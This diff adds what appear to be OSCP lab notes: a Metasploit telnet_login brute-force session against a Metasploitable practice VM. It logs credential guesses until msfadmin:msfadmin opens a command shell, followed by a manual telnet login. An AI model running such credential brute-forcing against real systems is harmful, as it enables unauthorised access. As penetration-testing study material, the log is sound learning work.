@@ -1,0 +1,95 @@
+msf6 auxiliary(scanner/telnet/telnet_login) > show options 
+
+Module options (auxiliary/scanner/telnet/telnet_login):
+
+   Name              Current Setting                                              Required  Description
+   ----              ---------------                                              --------  -----------
+   BLANK_PASSWORDS   false                                                        no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                            yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                        no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                        no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                        no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                                                         no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+   PASSWORD          ./pasword                                                    no        A specific password to authenticate with
+   PASS_FILE         /home/kali/001.Git/OSCP/002.Metasploitable/Port.23/password  no        File containing passwords, one per line
+   RHOSTS                                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT             23                                                           yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                        yes       Stop guessing when a credential works for a host
+   THREADS           1                                                            yes       The number of concurrent threads (max one per host)
+   USERNAME                                                                       no        A specific username to authenticate as
+   USERPASS_FILE                                                                  no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                        no        Try the username as the password for all users
+   USER_FILE         /home/kali/001.Git/OSCP/002.Metasploitable/Port.23/Username  no        File containing usernames, one per line
+   VERBOSE           true                                                         yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/telnet/telnet_login) > set THREADS 10
+THREADS => 10
+msf6 auxiliary(scanner/telnet/telnet_login) > exploit
+
+[-] Msf::OptionValidateError The following options failed to validate: RHOSTS
+msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.1.38
+RHOSTS => 192.168.1.38
+msf6 auxiliary(scanner/telnet/telnet_login) > exploit
+
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: admin:./pasword (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: admin:admin (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: admin:root (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: admin:msfadmin (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: root:./pasword (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: root:admin (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: root:root (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: root:msfadmin (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: msfadmin:./pasword (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: msfadmin:admin (Incorrect: )
+[-] 192.168.1.38:23       - 192.168.1.38:23 - LOGIN FAILED: msfadmin:root (Incorrect: )
+[+] 192.168.1.38:23       - 192.168.1.38:23 - Login Successful: msfadmin:msfadmin
+[*] 192.168.1.38:23       - Attempting to start session 192.168.1.38:23 with msfadmin:msfadmin
+[*] Command shell session 1 opened (192.168.1.39:33843 -> 192.168.1.38:23 ) at 2021-12-19 00:34:51 -0500
+[*] 192.168.1.38:23       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/telnet/telnet_login) > 
+
+
+
+
+With Command Line ==================================================
+
+└─# telnet 192.168.1.38                                                                                                                                                                                                                  1 ⨯
+Trying 192.168.1.38...
+Connected to 192.168.1.38.
+Escape character is '^]'.
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+metasploitable login: msfadmin
+Password: 
+Last login: Sat Dec 18 06:13:15 EST 2021 from 192.168.1.39 on pts/1
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+msfadmin@metasploitable:~$ 
+
